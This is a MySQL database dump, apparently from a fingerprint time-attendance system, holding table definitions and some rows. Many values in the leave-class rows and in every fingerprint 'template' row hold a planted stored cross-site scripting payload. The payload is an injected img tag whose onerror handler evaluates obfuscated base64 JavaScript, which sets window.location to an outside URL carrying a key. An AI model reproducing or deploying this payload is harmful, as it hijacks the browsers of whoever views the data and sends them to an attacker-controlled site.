onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>',3,1,0,'A','0',0,0,3,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>'),(1005,'OT','1',1,1,1,'+','0',0,0,3,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>'),(1006,'OTH','1',1,0,1,'=','0',0,0,0,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>'),(1007,'Hol.','\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>',3,2,1,'-','0',0,0,2,NULL),(1008,'NoIn','1',4,2,1,'[','0',0,0,2,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>'),(1009,'NoOut','1',4,2,1,']','0',0,0,2,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>'),(1010,'ROT','1',4,2,1,'{','0',0,0,3,NULL),(1011,'BOUT','1',4,2,1,'}','0',0,0,3,NULL),(1012,'OUT','1',1,2,1,'L','0',0,0,3,NULL),(1013,'FOT','1',1,2,1,'F','0',0,0,3,NULL);
/*!40000 ALTER TABLE `leaveclass1` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `num_run`
--

DROP TABLE IF EXISTS `num_run`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `num_run` (
  `Num_runID` int(11) NOT NULL AUTO_INCREMENT,
  `OLDID` int(11) DEFAULT NULL,
  `Name` varchar(30) NOT NULL,
  `StartDate` date DEFAULT NULL,
  `EndDate` date DEFAULT NULL,
  `Cyle` smallint(6) DEFAULT NULL,
  `Units` smallint(6) DEFAULT NULL,
  PRIMARY KEY (`Num_runID`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `num_run`
--

LOCK TABLES `num_run` WRITE;
/*!40000 ALTER TABLE `num_run` DISABLE KEYS */;
/*!40000 ALTER TABLE `num_run` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `num_run_deil`
--

DROP TABLE IF EXISTS `num_run_deil`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `num_run_deil` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `Num_runID` int(11) NOT NULL,
  `StartTime` varchar(900) DEFAULT NULL,
  `EndTime` varchar(900) DEFAULT NULL,
  `Sdays` smallint(6) NOT NULL,
  `Edays` smallint(6) DEFAULT NULL,
  `SchclassID` int(11) DEFAULT NULL,
  `OverTime` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `Num_runID` (`Num_runID`,`Sdays`,`StartTime`) USING HASH,
  KEY `num_run_deil_Num_runID` (`Num_runID`),
  KEY `num_run_deil_SchclassID` (`SchclassID`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `num_run_deil`
--

LOCK TABLES `num_run_deil` WRITE;
/*!40000 ALTER TABLE `num_run_deil` DISABLE KEYS */;
/*!40000 ALTER TABLE `num_run_deil` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `schclass`
--

DROP TABLE IF EXISTS `schclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `schclass` (
  `SchclassID` int(11) NOT NULL AUTO_INCREMENT,
  `SchName` varchar(20) NOT NULL,
  `StartTime` varchar(900) DEFAULT NULL,
  `EndTime` varchar(900) DEFAULT NULL,
  `LateMinutes` int(11) DEFAULT NULL,
  `EarlyMinutes` int(11) DEFAULT NULL,
  `CheckIn` smallint(6) DEFAULT NULL,
  `CheckOut` smallint(6) DEFAULT NULL,
  `CheckInTime1` varchar(900) DEFAULT NULL,
  `CheckInTime2` varchar(900) DEFAULT NULL,
  `CheckOutTime1` varchar(900) DEFAULT NULL,
  `CheckOutTime2` varchar(900) DEFAULT NULL,
  `Color` int(11) DEFAULT NULL,
  `AutoBind` smallint(6) DEFAULT NULL,
  `WorkDay` varchar(900) DEFAULT NULL,
  PRIMARY KEY (`SchclassID`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `schclass`
--

LOCK TABLES `schclass` WRITE;
/*!40000 ALTER TABLE `schclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `schclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `securitydetails`
--

DROP TABLE IF EXISTS `securitydetails`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `securitydetails` (
  `SecuritydetailID` int(11) NOT NULL AUTO_INCREMENT,
  `UserID` smallint(6) DEFAULT NULL,
  `DeptID` smallint(6) DEFAULT NULL,
  `Schedule` smallint(6) DEFAULT NULL,
  `UserInfo` smallint(6) DEFAULT NULL,
  `EnrollFingers` smallint(6) DEFAULT NULL,
  `ReportView` smallint(6) DEFAULT NULL,
  `Report` varchar(10) DEFAULT NULL,
  PRIMARY KEY (`SecuritydetailID`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `securitydetails`
--

LOCK TABLES `securitydetails` WRITE;
/*!40000 ALTER TABLE `securitydetails` DISABLE KEYS */;
/*!40000 ALTER TABLE `securitydetails` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `shift`
--

DROP TABLE IF EXISTS `shift`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `shift` (
  `ShiftID` int(11) NOT NULL AUTO_INCREMENT,
  `Name` varchar(20) DEFAULT NULL,
  `UshiftID` int(11) DEFAULT NULL,
  `StartDate` date NOT NULL,
  `EndDate` date DEFAULT NULL,
  `RunNum` smallint(6) DEFAULT NULL,
  `SCH1` int(11) DEFAULT NULL,
  `SCH2` int(11) DEFAULT NULL,
  `SCH3` int(11) DEFAULT NULL,
  `SCH4` int(11) DEFAULT NULL,
  `SCH5` int(11) DEFAULT NULL,
  `SCH6` int(11) DEFAULT NULL,
  `SCH7` int(11) DEFAULT NULL,
  `SCH8` int(11) DEFAULT NULL,
  `SCH9` int(11) DEFAULT NULL,
  `SCH10` int(11) DEFAULT NULL,
  `SCH11` int(11) DEFAULT NULL,
  `SCH12` int(11) DEFAULT NULL,
  `Cycle` smallint(6) DEFAULT NULL,
  `UnitS` smallint(6) DEFAULT NULL,
  PRIMARY KEY (`ShiftID`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `shift`
--

LOCK TABLES `shift` WRITE;
/*!40000 ALTER TABLE `shift` DISABLE KEYS */;
/*!40000 ALTER TABLE `shift` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `template`
--

DROP TABLE IF EXISTS `template`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `template` (
  `templateid` int(11) NOT NULL AUTO_INCREMENT,
  `userid` int(11) NOT NULL,
  `Template` varchar(900) DEFAULT NULL,
  `FingerID` smallint(6) NOT NULL,
  `Valid` smallint(6) NOT NULL,
  `DelTag` smallint(6) NOT NULL,
  `SN` varchar(20) DEFAULT NULL,
  `UTime` datetime DEFAULT NULL,
  `BITMAPPICTURE` varchar(900) DEFAULT NULL,
  `BITMAPPICTURE2` varchar(900) DEFAULT NULL,
  `BITMAPPICTURE3` varchar(900) DEFAULT NULL,
  `BITMAPPICTURE4` varchar(900) DEFAULT NULL,
  `USETYPE` smallint(6) DEFAULT NULL,
  `Template2` varchar(900) DEFAULT NULL,
  `Template3` varchar(900) DEFAULT NULL,
  PRIMARY KEY (`templateid`),
  UNIQUE KEY `userid` (`userid`,`FingerID`),
  UNIQUE KEY `USERFINGER` (`userid`,`FingerID`),
  KEY `template_userid` (`userid`),
  KEY `template_SN` (`SN`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `template`
--

LOCK TABLES `template` WRITE;
/*!40000 ALTER TABLE `template` DISABLE KEYS */;
INSERT INTO `template` VALUES (1,3,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>',6,1,0,'A3AG223160114','2022-11-30 00:18:44',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(2,4,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>',6,1,0,'A3AG223160114','2022-11-30 00:18:44',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(3,5,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>',6,1,0,'A3AG223160114','2022-11-30 00:18:44',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(4,2,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>',6,1,0,'A3AG223160114','2022-11-30 00:18:44',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(5,6,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>',6,1,0,'A3AG223160114','2022-11-30 10:48:18',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(6,7,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>',5,1,0,'A3AG223160114','2022-11-30 13:52:50',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(7,8,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>',5,1,0,'A3AG223160114','2022-12-01 00:27:24',NULL,NULL,NULL,NULL,NULL,NULL,NULL),(8,9,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>',5,1,0,'A3AG223160114','2022-12-01 14:29:24',NULL,NULL,NULL,NULL,NULL,NULL,NULL);
/*!40000 ALTER TABLE `template` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user_of_run`
--

DROP TABLE IF EXISTS `user_of_run`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `user_of_run` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `UserID` int(11) NOT NULL,
  `StartDate` date NOT NULL,
  `EndDate` date NOT NULL,
  `NUM_OF_RUN_ID` int(11) NOT NULL,
  `ISNOTOF_RUN` int(11) DEFAULT NULL,
  `ORDER_RUN` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `UserID` (`UserID`,`NUM_OF_RUN_ID`,`StartDate`,`EndDate`),
  KEY `user_of_run_UserID` (`UserID`),
  KEY `user_of_run_NUM_OF_RUN_ID` (`NUM_OF_RUN_ID`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user_of_run`
--

LOCK TABLES `user_of_run` WRITE;
/*!40000 ALTER TABLE `user_of_run` DISABLE KEYS */;
/*!40000 ALTER TABLE `user_of_run` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user_speday`
--

DROP TABLE IF EXISTS `user_speday`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `user_speday` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `UserID` int(11) NOT NULL,
  `StartSpecDay` datetime NOT NULL,
  `EndSpecDay` datetime DEFAULT NULL,
  `DateID` int(11) NOT NULL,
  `YUANYING` varchar(900) DEFAULT NULL,
  `Date` datetime DEFAULT NULL,
  `State` smallint(6) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `UserID` (`UserID`,`StartSpecDay`,`DateID`),
  KEY `user_speday_UserID` (`UserID`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user_speday`
--

LOCK TABLES `user_speday` WRITE;
/*!40000 ALTER TABLE `user_speday` DISABLE KEYS */;
/*!40000 ALTER TABLE `user_speday` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user_temp_sch`
--

DROP TABLE IF EXISTS `user_temp_sch`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `user_temp_sch` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `UserID` int(11) NOT NULL,
  `ComeTime` datetime NOT NULL,
  `LeaveTime` datetime NOT NULL,
  `OverTime` int(11) NOT NULL,
  `Type` smallint(6) DEFAULT NULL,
  `Flag` smallint(6) DEFAULT NULL,
  `SchClassID` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `UserID` (`UserID`,`ComeTime`,`LeaveTime`),
  KEY `user_temp_sch_UserID` (`UserID`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user_temp_sch`
--

LOCK TABLES `user_temp_sch` WRITE;
/*!40000 ALTER TABLE `user_temp_sch` DISABLE KEYS */;
/*!40000 ALTER TABLE `user_temp_sch` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `userinfo`
--

